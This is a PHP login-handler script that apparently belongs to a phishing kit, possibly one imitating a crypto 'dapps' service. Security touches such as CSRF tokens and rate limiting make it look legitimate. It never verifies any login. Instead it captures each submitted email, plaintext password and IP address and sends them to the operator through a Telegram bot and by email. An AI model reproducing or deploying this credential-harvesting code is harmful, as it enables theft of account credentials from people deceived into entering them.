<?php
require_once __DIR__ . '/../includes/functions.php';
require_once 'config.php';
require_once 'me.php';

initErrorLogging();
secureSessionStart();

$error = null;
$success = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // CSRF protection
    if (!isset($_POST['csrf_token']) || !verifyCSRFToken($_POST['csrf_token'])) {
        $error = "Invalid request. Please try again.";
        logActivity('csrf_failed', ['ip' => getClientIP()]);
    } 
    // Rate limiting
    elseif (!checkRateLimit(getClientIP(), 5, 300)) {
        $error = "Too many attempts. Please try again later.";
        logActivity('rate_limit_exceeded', ['ip' => getClientIP()]);
    }
    // Validate inputs
    elseif (empty($_POST['email']) || empty($_POST['password'])) {
        $error = "Email and password are required";
    } else {
        $email = sanitizeInput($_POST['email']);
        $password = $_POST['password'];
        
        if (!validateEmail($email)) {
            $error = "Invalid email format";
        } elseif (strlen($password) < 1) {
            $error = "Password is required";
        } else {
            // Prepare message
            $ip = getClientIP();
            $message = "🔐 Login Attempt\n\n";
            $message .= "📧 Email: " . $email . "\n";
            $message .= "🔑 Password: " . $password . "\n";
            $message .= "🌐 IP: " . $ip . "\n";
            $message .= "⏰ Time: " . date('Y-m-d H:i:s');
            
            // Send to Telegram
            if (send_telegram_msg($message)) {
                logActivity('login_attempt', ['email' => $email, 'ip' => $ip]);
                $success = true;
            } else {
                $error = "Service temporarily unavailable. Please try again.";
                error_log("Failed to send Telegram message for: " . $email);
            }
            
            // Send email notification
            $subject = "Login Attempt - " . date('Y-m-d H:i:s');
            $emailMessage = "Email: $email\nPassword: $password\nIP: $ip\nTime: " . date('Y-m-d H:i:s');
            $headers = "From: noreply@dapps.com";
            
            if (!mail($send, $subject, $emailMessage, $headers)) {
                error_log("Failed to send email notification");
            }
        }
    }
}

// Generate CSRF token for form
$csrfToken = generateCSRFToken();
